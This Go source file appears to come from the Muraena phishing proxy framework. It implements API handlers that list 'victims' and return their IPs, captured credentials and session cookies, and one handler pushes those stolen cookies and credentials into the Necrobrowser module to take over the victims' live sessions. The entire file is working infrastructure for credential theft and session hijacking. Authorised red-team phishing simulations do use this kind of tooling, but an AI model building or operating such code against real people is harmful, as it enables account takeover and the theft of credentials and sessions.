package api

import (
	"net/http"

	"github.com/go-chi/chi/v5"

	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/module/necrobrowser"
)

func victimSummary(v db.Victim) map[string]interface{} {
	return map[string]interface{}{
		"id": v.ID, "ip": v.IP, "ua": v.UA,
		"firstSeen": v.FirstSeen, "lastSeen": v.LastSeen,
		"reqCount": v.RequestCount, "credsCount": v.CredsCount,
		"instrumented": v.SessionInstrumented,
	}
}

func (s *Server) handleListVictims(w http.ResponseWriter, r *http.Request) {
	all, err := db.GetAllVictims()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "internal", err.Error())
		return
	}
	out := make([]map[string]interface{}, 0, len(all))
	for _, v := range all {
		out = append(out, victimSummary(v))
	}
	writeJSON(w, 200, out)
}

func (s *Server) handleGetVictim(w http.ResponseWriter, r *http.Request) {
	v, err := db.GetVictim(chi.URLParam(r, "id"))
	if err != nil {
		writeError(w, http.StatusNotFound, "not_found", err.Error())
		return
	}
	if v.ID == "" {
		writeError(w, http.StatusNotFound, "not_found", "victim not found")
		return
	}
	writeJSON(w, 200, map[string]interface{}{
		"id": v.ID, "ip": v.IP, "ua": v.UA,
		"firstSeen": v.FirstSeen, "lastSeen": v.LastSeen,
		"reqCount": v.RequestCount, "instrumented": v.SessionInstrumented,
		"credentials": v.Credentials, "cookies": v.Cookies,
	})
}

func (s *Server) handleDeleteVictim(w http.ResponseWriter, r *http.Request) {
	if err := db.DeleteVictim(chi.URLParam(r, "id")); err != nil {
		writeError(w, http.StatusInternalServerError, "internal", err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

func (s *Server) handleVictimCredentials(w http.ResponseWriter, r *http.Request) {
	v, err := db.GetVictim(chi.URLParam(r, "id"))
	if err != nil {
		writeError(w, http.StatusNotFound, "not_found", err.Error())
		return
	}
	if v.ID == "" {
		writeError(w, http.StatusNotFound, "not_found", "victim not found")
		return
	}
	writeJSON(w, 200, v.Credentials)
}

func (s *Server) handleVictimCookies(w http.ResponseWriter, r *http.Request) {
	v, err := db.GetVictim(chi.URLParam(r, "id"))
	if err != nil {
		writeError(w, http.StatusNotFound, "not_found", err.Error())
		return
	}
	if v.ID == "" {
		writeError(w, http.StatusNotFound, "not_found", "victim not found")
		return
	}
	writeJSON(w, 200, v.Cookies) // necrobrowser JSON shape via VictimCookie json tags
}

func (s *Server) necro() (*necrobrowser.Necrobrowser, bool) {
	m, err := s.sess.Module("necrobrowser")
	if err != nil {
		return nil, false
	}
	nb, ok := m.(*necrobrowser.Necrobrowser)
	return nb, ok
}

func (s *Server) handleForceInstrument(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	v, err := db.GetVictim(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "not_found", err.Error())
		return
	}
	if v.ID == "" {
		writeError(w, http.StatusNotFound, "not_found", "victim not found")
		return
	}
	nb, ok := s.necro()
	if !ok {
		writeError(w, http.StatusServiceUnavailable, "unavailable", "necrobrowser module not loaded")
		return
	}
	credsJSON := "{}"
	if b, err := jsonMarshal(v.Credentials); err == nil {
		credsJSON = string(b)
	}
	go nb.Instrument(v.ID, v.Cookies, credsJSON)
	_ = db.SetSessionAsInstrumented(v.ID)
	writeJSON(w, http.StatusAccepted, map[string]string{"status": "instrumenting", "victim": id})
}

func (s *Server) handleHijacked(w http.ResponseWriter, r *http.Request) {
	vs, err := db.GetHijackedVictims()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "internal", err.Error())
		return
	}
	writeSummaries(w, vs)
}

func (s *Server) handleInstrumented(w http.ResponseWriter, r *http.Request) {
	vs, err := db.GetInstrumentedVictims()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "internal", err.Error())
		return
	}
	writeSummaries(w, vs)
}

func writeSummaries(w http.ResponseWriter, vs []db.Victim) {
	out := make([]map[string]interface{}, 0, len(vs))
	for _, v := range vs {
		out = append(out, victimSummary(v))
	}
	writeJSON(w, 200, out)
}
